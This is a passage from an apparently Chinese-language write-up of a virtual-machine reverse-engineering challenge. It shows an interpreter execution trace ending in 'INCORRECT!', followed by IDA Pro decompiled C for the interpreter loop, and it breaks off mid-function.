arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">a</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xdb f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xe2<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xe2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xe2 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xdc f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x40 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[j]</span> JMP N d<br><span class="hljs-selector-attr">[j]</span> ... TAKEN<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xe2 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xe3 f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> STK d c<br><span class="hljs-selector-attr">[s]</span> ... pushing c<br><span class="hljs-selector-attr">[s]</span> ... popping d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xc s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xe4 f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">i</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">i</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xc s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x85 f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xc s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x86 f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> CMP d c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xc s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x87 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x88 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x40 arg1:<span class="hljs-number">0</span>x10 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[j]</span> JMP E d<br><span class="hljs-selector-attr">[j]</span> ... NOT TAKEN<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x89 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xb1<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xb1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xb1 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8a f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x40 arg1:<span class="hljs-number">0</span>xa arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[j]</span> JMP LG d<br><span class="hljs-selector-attr">[j]</span> ... TAKEN<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xb1 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb2 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x1 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xb1 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb3 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x40<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">b</span> s<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xb1 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb4 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x49<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x49<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x49 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb5 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x49 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb6 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x4e<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x4e<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x4e s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb7 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x4e s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb8 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x43<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x43<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x43 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb9 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x43 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xba f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x4f<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x4f<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x4f s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xbb f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x4f s:<span class="hljs-number">0</span>x9 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xbc f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x52<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x52<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span>x9 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xbd f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span>xa <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xbe f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x52<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x52<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span>xa <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xbf f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span>xb <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc0 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x45<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x45<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x45 s:<span class="hljs-number">0</span>xb <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc1 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x45 s:<span class="hljs-number">0</span>xc <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc2 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x43<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x43<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x43 s:<span class="hljs-number">0</span>xc <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc3 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x43 s:<span class="hljs-number">0</span>xd <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc4 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x54<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x54<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x54 s:<span class="hljs-number">0</span>xd <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc5 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x54 s:<span class="hljs-number">0</span>xe <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc6 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x21<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x21<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x21 s:<span class="hljs-number">0</span>xe <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc7 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x21 s:<span class="hljs-number">0</span>xf <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc8 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xa<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xa<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xa s:<span class="hljs-number">0</span>xf <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc9 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xa s:<span class="hljs-number">0</span>x10 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xca f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xb<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xb<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span>xb d:<span class="hljs-number">0</span>xa s:<span class="hljs-number">0</span>x10 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xcb f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span>xb d:<span class="hljs-number">0</span>xa s:<span class="hljs-number">0</span>x10 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xcc f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x1 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x8 d<br><span class="hljs-selector-attr">[s]</span> ... write<br>INCORRECT!<br><span class="hljs-selector-attr">[s]</span> ... return value (<span class="hljs-keyword">in</span> register d): <span class="hljs-number">0</span>xb<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span>xb d:<span class="hljs-number">0</span>xb s:<span class="hljs-number">0</span>x10 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xcd f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span>xb d:<span class="hljs-number">0</span>xb s:<span class="hljs-number">0</span>x10 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xce f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x1 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x20 NONE<br><span class="hljs-selector-attr">[s]</span> ... exit<br></code></pre></td></tr></table></figure>

<p>还挺复杂的…下面的是idapro的逆向源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">interpreter_loop</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int8 v1; <span class="hljs-comment">// al</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v1 = *(_BYTE *)(a1 + <span class="hljs-number">1029</span>);<br>    *(_BYTE *)(a1 + <span class="hljs-number">1029</span>) = v1 + <span class="hljs-number">1</span>;<br>    interpret_instruction(<br>      a1,<br>      *(<span class="hljs-type">unsigned</span> __int16 *)(a1 + <span class="hljs-number">3LL</span> * v1) | ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(a1 + <span class="hljs-number">3LL</span> * v1 + <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">16</span>));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">interpret_instruction</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> __int8 *a1, __int64 a2)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>	<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;[V] a:%#hhx b:%#hhx c:%#hhx d:%#hhx s:%#hhx i:%#hhx f:%#hhx\n&quot;</span>,<br>    a1[<span class="hljs-number">1024</span>],<br>    a1[<span class="hljs-number">1025</span>],<br>    a1[<span class="hljs-number">1026</span>],<br>    a1[<span class="hljs-number">1027</span>],<br>    a1[<span class="hljs-number">1028</span>],<br>    a1[<span class="hljs-number">1029</span>],<br>    a1[<span class="hljs-number">1030</span>]);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[I] op:%#hhx arg1:%#hhx arg2:%#hhx\n&quot;</span>, BYTE2(a2), (<span class="hljs-type">unsigned</span> __int8)a2, BYTE1(a2));<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x200000</span>) != <span class="hljs-number">0</span> )<br>    interpret_imm(a1, a2);<br>  <span class="hljs-keyword">if</span> 